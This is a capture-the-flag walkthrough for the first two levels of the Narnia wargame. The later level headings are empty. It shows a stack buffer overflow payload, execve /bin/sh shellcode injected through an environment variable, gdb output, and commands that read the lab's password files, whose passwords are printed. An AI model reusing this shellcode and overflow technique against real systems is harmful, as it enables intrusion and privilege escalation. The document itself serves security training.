# Narnia

## Narnia0
```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: abcdabcdabcdabcd
buf: abcdabcdabcdabcd
val: 0x41414141
WAY OFF!!!!
```
```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaabbbb
buf: aaaaaaaaaaaaaaaaaaaabbbb
val: 0x62626262
WAY OFF!!!!
```
```
narnia0@narnia:/narnia$ ( echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde";cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
## Narnia1
### Source code:
```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
### Exploit:
```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x90" * 50')
```
```
[----------------------------------registers-----------------------------------]
EAX: 0xffffde6d --> 0x90909090
EBX: 0x0
ECX: 0x8048542 --> 0x69470047 ('G')
EDX: 0xffffde6b --> 0x90903d47
ESI: 0x1
EDI: 0xf7fc5000 --> 0x1b2db0
EBP: 0xffffd688 --> 0x0
ESP: 0xffffd680 --> 0x80484b8 (<main+77>:       mov    eax,0x0)
EIP: 0xffffde6d --> 0x90909090
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xffffde6d:  nop
   0xffffde6e:  nop
   0xffffde6f:  nop
   0xffffde70:  nop
[------------------------------------stack-------------------------------------]
0000| 0xffffd680 --> 0x80484b8 (<main+77>:      mov    eax,0x0)
0004| 0xffffd684 --> 0xffffde6d --> 0x90909090
0008| 0xffffd688 --> 0x0
0012| 0xffffd68c --> 0xf7e2a286 (<__libc_start_main+246>:       add    esp,0x10)
0016| 0xffffd690 --> 0x1
0020| 0xffffd694 --> 0xffffd724 --> 0xffffd854 ("/narnia/narnia1")
0024| 0xffffd698 --> 0xffffd72c --> 0xffffd864 ("LC_ALL=en_US.UTF-8")
0028| 0xffffd69c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xffffde6d in ?? ()
gdb-peda$
```
```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
$
```
## Narnia2
## Narnia3
## Narnia4
## Narnia5
## Narnia6
## Narnia7
## Narnia8
## Narnia9
